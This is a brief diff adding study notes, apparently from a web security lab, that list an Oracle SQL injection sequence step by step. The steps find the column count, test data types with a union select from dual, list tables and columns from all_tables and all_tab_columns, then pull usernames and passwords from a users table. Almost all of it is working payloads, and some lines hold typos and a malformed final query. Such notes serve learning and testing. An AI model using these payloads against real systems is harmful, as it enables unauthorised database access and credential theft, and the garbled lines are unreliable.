@@ -1,0 +1,12 @@
+#listing the database contents on Oracle
+
+1.Find the number of columns 'order by 1--
+
+2.data type 'union select 'a','a' from dual--//dual means fake table
+
+3.finding table contain 'union SELECT table_name,null FROM all_tables--
+
+4.finding Column union SELECT column,null FROM all_tab_columns WHERE table_name = 'USERS_QWGZAX' --//finding username and passwoed in this
+ 
+5.union select username,paswword from 'USERS_QWGZAX'--
+
